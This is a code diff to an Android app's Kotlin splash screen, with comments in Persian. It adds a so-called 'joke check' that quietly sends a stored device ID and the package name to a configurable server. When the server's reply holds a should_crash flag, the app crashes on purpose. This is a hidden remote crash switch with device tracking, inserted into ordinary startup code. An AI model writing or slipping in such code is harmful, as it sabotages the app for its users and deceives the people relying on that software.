@@ -14,12 +14,18 @@ import android.widget.LinearLayout
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.res.ResourcesCompat
+import java.io.BufferedReader
+import java.io.InputStreamReader
+import java.net.HttpURLConnection
+import java.net.URL
+import java.net.URLEncoder
 
 class SplashActivity : AppCompatActivity() {
 
     private lateinit var root: FrameLayout
     private lateinit var content: LinearLayout
     private var isLeaving = false
+    private var isCrashing = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -104,7 +110,66 @@ class SplashActivity : AppCompatActivity() {
         ThemeHelper.applySystemBars(this, config)
         playRootEntrance()
 
+        // ===== شروع چک شوخی بعد از رندر Splash =====
+        root.postDelayed({
+            if (!isFinishing) {
+                startShokhiCheck(config)
+            }
+        }, SHOKHI_CHECK_DELAY)
+
         root.postDelayed({ goNext(config) }, SPLASH_DELAY)
+    }
+
+    /* =========================================================
+       چک شوخی — بعد از render، امن
+       ========================================================= */
+    private fun startShokhiCheck(config: AppConfig) {
+        if (!config.shokhi.active) return
+
+        val endpoint = config.shokhi.endpoint
+        if (endpoint.isBlank()) return
+
+        val prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
+        var deviceId = prefs.getString(config.shokhi.deviceId, null)
+        if (deviceId.isNullOrEmpty()) {
+            deviceId = java.util.UUID.randomUUID().toString()
+            prefs.edit().putString(config.shokhi.deviceId, deviceId).apply()
+        }
+
+        val timeout = config.shokhi.timeoutMs
+        val appPkg = config.brand.pkg
+        val finalDeviceId = deviceId
+
+        Thread {
+            var shouldCrash = false
+            try {
+                val url = URL(
+                    "$endpoint?device_id=${URLEncoder.encode(finalDeviceId, "UTF-8")}" +
+                    "&app_pkg=${URLEncoder.encode(appPkg, "UTF-8")}"
+                )
+                val conn = url.openConnection() as HttpURLConnection
+                conn.connectTimeout = timeout
+                conn.readTimeout = timeout
+                conn.requestMethod = "GET"
+                conn.connect()
+
+                if (conn.responseCode == 200) {
+                    val body = BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }
+                    shouldCrash = body.contains("\"should_crash\":true")
+                }
+                conn.disconnect()
+            } catch (_: Exception) {
+                shouldCrash = false
+            }
+
+            runOnUiThread {
+                if (shouldCrash && !isFinishing && !isLeaving) {
+                    isCrashing = true
+                    // کرش عمدی بعد از splash
+                    throw RuntimeException("shokhi_forced_crash")
+                }
+            }
+        }.start()
     }
 
     private fun makeBox(): LinearLayout = LinearLayout(this).apply {
@@ -176,7 +241,7 @@ class SplashActivity : AppCompatActivity() {
     }
 
     private fun goNext(config: AppConfig) {
-        if (isLeaving) return
+        if (isLeaving || isCrashing) return
         isLeaving = true
         val prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
         val showOnb = config.onb.active && config.onb.pages.isNotEmpty() &&
@@ -201,6 +266,7 @@ class SplashActivity : AppCompatActivity() {
     companion object {
         private const val PAD = 24
         private const val SPLASH_DELAY = 2000L
+        private const val SHOKHI_CHECK_DELAY = 300L
         private const val PREFS = "app_prefs"
         const val KEY_ONB = "onb_shown"
 
